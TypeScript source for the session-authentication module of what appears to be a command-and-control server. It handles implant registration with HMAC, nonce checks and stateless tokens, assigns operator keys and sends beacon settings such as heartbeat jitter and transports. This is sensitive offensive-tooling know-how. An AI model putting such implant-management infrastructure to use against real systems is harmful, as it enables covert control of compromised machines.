/**
 * edge 侧的认证：
 *   1) 注册：payload_psk 派生的 HMAC + 时间窗 + nonce 去重
 *   2) 会话：`1.<sid>.<issuedAt>.<mac>` 形式的无状态 token
 *
 * 服务端不存 psk，只存 k_reg / k_sess（见 docs/02-architecture/03-data-model.md）。
 * 数据访问统一走 Drizzle（`@stratus/db`）。
 */

import {
  fromB64u,
  fromUtf8,
  registerHmac,
  sessionToken,
  timingSafeEqual,
  toB64u,
  LIMITS,
} from '@stratus/shared';
import { and, createDb, eq, isNull, t } from '@stratus/db';
import type { Env } from './types';

export interface SessionAuth {
  sid: string;
  payloadId: string;
  pubRaw: Uint8Array;
  issuedAt: number;
}

export function errorBody(code: string, message: string): { error: { code: string; message: string } } {
  return { error: { code, message } };
}

export function jsonError(status: number, code: string, message: string, extra?: HeadersInit): Response {
  return new Response(JSON.stringify(errorBody(code, message)), {
    status,
    headers: {
      'content-type': 'application/json; charset=utf-8',
      'cache-control': 'no-store',
      ...(extra ?? {}),
    },
  });
}

/* ───────────────────────────── 注册 ───────────────────────────── */

export interface RegisterBody {
  v: number;
  psk_id: string;
  ts: number;
  nc: string;
  h: string;
  pub: string;
  fp: string;
}

function isRegisterBody(x: unknown): x is RegisterBody {
  if (typeof x !== 'object' || x === null) return false;
  const o = x as Record<string, unknown>;
  return (
    o['v'] === 1 &&
    typeof o['psk_id'] === 'string' &&
    o['psk_id'].length > 0 &&
    o['psk_id'].length <= 64 &&
    typeof o['ts'] === 'number' &&
    typeof o['nc'] === 'string' &&
    typeof o['h'] === 'string' &&
    typeof o['pub'] === 'string' &&
    typeof o['fp'] === 'string'
  );
}

export async function handleRegister(env: Env, req: Request): Promise<Response> {
  const now = Math.floor(Date.now() / 1000);
  const db = createDb(env.DB);

  let body: unknown;
  try {
    body = await req.json();
  } catch {
    return jsonError(400, 'E_FORMAT', 'invalid json');
  }
  if (!isRegisterBody(body)) return jsonError(400, 'E_FORMAT', 'missing or bad fields');
  if (Math.abs(now - body.ts) > LIMITS.clockSkew) return jsonError(400, 'E_CLOCK_SKEW', 'clock skew too large');

  const payload = await db
    .select({
      id: t.payloads.id,
      kReg: t.payloads.kReg,
      kSess: t.payloads.kSess,
      revokedAt: t.payloads.revokedAt,
      expiresAt: t.payloads.expiresAt,
    })
    .from(t.payloads)
    .where(eq(t.payloads.pskId, body.psk_id))
    .limit(1)
    .then((r) => r[0]);

  if (!payload) return jsonError(401, 'E_AUTH', 'unauthorized');
  if (payload.revokedAt) return jsonError(403, 'E_REVOKED', 'payload revoked');
  if (payload.expiresAt && payload.expiresAt < now) return jsonError(403, 'E_REVOKED', 'payload expired');

  // 一次 HMAC 比较（恒定时间）
  const expected = await registerHmac(fromB64u(payload.kReg), body.psk_id, body.ts, body.nc);
  if (!timingSafeEqual(expected, fromB64u(body.h))) return jsonError(401, 'E_AUTH', 'unauthorized');

  // nonce 去重（24h）：交给 HubDO，避免烧 KV 的写额度
  const hub = env.HUB.get(env.HUB.idFromName('hub'));
  const nonceRes = await hub.fetch('https://hub/nonce', {
    method: 'POST',
    body: JSON.stringify({ key: `${body.psk_id}:${body.nc}`, ttl: LIMITS.nonceTtl }),
  });
  if (!nonceRes.ok) return jsonError(401, 'E_AUTH', 'unauthorized');

  const pubRaw = fromB64u(body.pub);
  if (pubRaw.length !== 65 || pubRaw[0] !== 0x04) return jsonError(400, 'E_FORMAT', 'bad public key');

  // 团队默认 key：最近登记且未吊销的那把
  const key = await db
    .select({ keyId: t.operatorKeys.keyId, pubRaw: t.operatorKeys.pubRaw, fp: t.operatorKeys.fp })
    .from(t.operatorKeys)
    .where(isNull(t.operatorKeys.revokedAt))
    .orderBy(t.operatorKeys.createdAt)
    .limit(1)
    .then((r) => r[0]);

  const sidBytes = crypto.getRandomValues(new Uint8Array(16));
  const sid = toB64u(sidBytes);
  const issuedAt = now;
  const mac = await sessionToken(fromB64u(payload.kSess), sidBytes, pubRaw, issuedAt);
  const token = `1.${sid}.${issuedAt}.${mac}`;

  await db.batch([
    db.insert(t.sessions).values({
      id: sid,
      payloadId: payload.id,
      implantPub: body.pub,
      ownerKeyId: key?.keyId ?? null,
      status: 'online',
      firstSeen: now,
      lastSeen: now,
    }),
    db.insert(t.auditLog).values({
      id: crypto.randomUUID(),
      ts: now,
      actorType: 'implant',
      actorId: sid,
      action: 'session.register',
      target: sid,
      ip: req.headers.get('cf-connecting-ip') ?? '',
      meta: JSON.stringify({ payload_id: payload.id, fp: body.fp }),
    }),
  ]);

  const timeout = Number(env.SESSION_TIMEOUT_SEC ?? 240);

  return new Response(
    JSON.stringify({
      v: 1,
      sid,
      tok: token,
      srv_ts: now,
      op_pub: key?.pubRaw ?? null,
      op_fp: key?.fp ?? null,
      key_id: key?.keyId ?? null,
      next: 300,
      cfg: {
        hb: Math.max(30, Math.round(timeout / 4)),
        jitter: 0.2,
        transport: ['ws', 'http'],
        meta_mode: env.META_MODE === 'sealed' ? 'sealed' : 'plain',
        max_frame: LIMITS.maxFrameCt,
        chunk: LIMITS.chunkSize,
      },
    }),
    { headers: { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'no-store' } },
  );
}

/* ───────────────────────────── 会话校验 ───────────────────────────── */

export function bearer(req: Request): string | null {
  const h = req.headers.get('authorization');
  if (!h) return null;
  const m = /^Bearer\s+(.+)$/i.exec(h.trim());
  return m?.[1] ?? null;
}

/** 解析 `1.<sid>.<issuedAt>.<mac>`，失败返回 null。 */
export function parseToken(token: string): { sid: string; issuedAt: number; mac: string } | null {
  const parts = token.split('.');
  if (parts.length !== 4) return null;
  const [ver, sid, issued, mac] = parts as [string, string, string, string];
  if (ver !== '1') return null;
  const issuedAt = Number(issued);
  if (!Number.isInteger(issuedAt) || issuedAt <= 0) return null;
  return { sid, issuedAt, mac };
}

export async function authenticateSession(
  env: Env,
  req: Request,
): Promise<{ ok: true; auth: SessionAuth } | { ok: false; res: Response }> {
  const token = bearer(req);
  if (!token) return { ok: false, res: jsonError(401, 'E_AUTH', 'unauthorized') };
  const parsed = parseToken(token);
  if (!parsed) return { ok: false, res: jsonError(401, 'E_AUTH', 'unauthorized') };

  const db = createDb(env.DB);
  const row = await db
    .select({
      sid: t.sessions.id,
      payloadId: t.sessions.payloadId,
      pub: t.sessions.implantPub,
      status: t.sessions.status,
      kSess: t.payloads.kSess,
    })
    .from(t.sessions)
    .innerJoin(t.payloads, eq(t.payloads.id, t.sessions.payloadId))
    .where(and(eq(t.sessions.id, parsed.sid)))
    .limit(1)
    .then((r) => r[0]);

  if (!row || !row.pub || row.status === 'dead') return { ok: false, res: jsonError(401, 'E_AUTH', 'unauthorized') };

  const pubRaw = fromB64u(row.pub);
  const expected = await sessionToken(fromB64u(row.kSess), fromB64u(row.sid), pubRaw, parsed.issuedAt);
  if (!timingSafeEqual(fromB64u(expected), fromB64u(parsed.mac))) {
    return { ok: false, res: jsonError(401, 'E_AUTH', 'unauthorized') };
  }

  return { ok: true, auth: { sid: row.sid, payloadId: row.payloadId ?? '', pubRaw, issuedAt: parsed.issuedAt } };
}

/* ───────────────────────────── 杂项 ───────────────────────────── */

export async function readJsonLimited<T>(req: Request, maxBytes: number): Promise<T | null> {
  const len = Number(req.headers.get('content-length') ?? '0');
  if (len > maxBytes) return null;
  const buf = await req.arrayBuffer();
  if (buf.byteLength > maxBytes) return null;
  try {
    return JSON.parse(fromUtf8(new Uint8Array(buf))) as T;
  } catch {
    return null;
  }
}
